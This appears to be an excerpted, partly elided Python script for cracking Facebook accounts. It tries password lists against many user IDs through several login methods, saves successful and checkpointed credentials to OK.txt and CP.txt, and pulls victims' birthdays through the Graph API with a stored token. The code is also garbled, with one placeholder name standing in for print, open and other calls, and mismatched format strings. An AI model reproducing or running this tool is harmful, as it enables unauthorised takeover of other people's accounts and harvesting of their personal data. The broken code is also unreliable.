...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#JAHID('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = JAHID(self.apk).read().splitlines()
			JAHID(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							JAHID('[•] Result CP saved to CP.txt')
							JAHID('\n\tCrack Processing...\n')
							JAHID('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					JAHID('\n01.) Metode b-api ')
					JAHID('02.) Metode mbasic ')
					JAHID('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			JAHID('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			JAHID(' [1] JAHID Method 1 ')
			JAHID(' [2] JAHID Method 2  [ Pro ]')
			JAHID(' [3] JAHID Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [JAHID] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = JAHID('agent.txt', 'r').read()
			...
			if "access_token" in p:
				JAHID('\r\033[1;92m[Successful-JAHID] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = JAHID('login.txt').read()
					cp_ttl = Prof_JAHID('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					JAHID('\r\033[1;91m[Checkpoint-JAHID] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				JAHID('\r\033[1;91m[Checkpoint-JAHID] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				JAHID('\r\033[1;32m[Successful-JAHID] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = JAHID('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].JAHID('\r\033[1;91m[Checkpoint-JAHID] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				JAHID('\r\033[1;92m[Successful-JAHID] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :JAHID = ' '
		elif fx[:9] in ['100000000']       :JAHID = '  '
		elif fx[:8] in ['10000000']        :JAHID = ' '
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:JAHID = ' '
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:JAHID = ' '
		elif fx[:6] in ['100001']          :JAHID = ' '
		elif fx[:6] in ['100002','100003'] :JAHID = ' '
		elif fx[:6] in ['100004']          :JAHID = ' '
		elif fx[:6] in ['100005','100006'] :JAHID = ' '
		elif fx[:6] in ['100007','100008'] :JAHID = ' '
		elif fx[:6] in ['100009']          :JAHID = ' '
		elif fx[:5] in ['10001']           :JAHID = ' '
		elif fx[:5] in ['10002']           :JAHID = ' '
		elif fx[:5] in ['10003']           :JAHID = ' '
		elif fx[:5] in ['10004']           :JAHID = ' '
		elif fx[:5] in ['10005']           :JAHID = ' '
		elif fx[:5] in ['10006','10007','10008']:JAHID = ' '
		else:JAHID=''
	elif len(fx) in [9,10]:
		JAHID = ' '
	elif len(fx)==8:
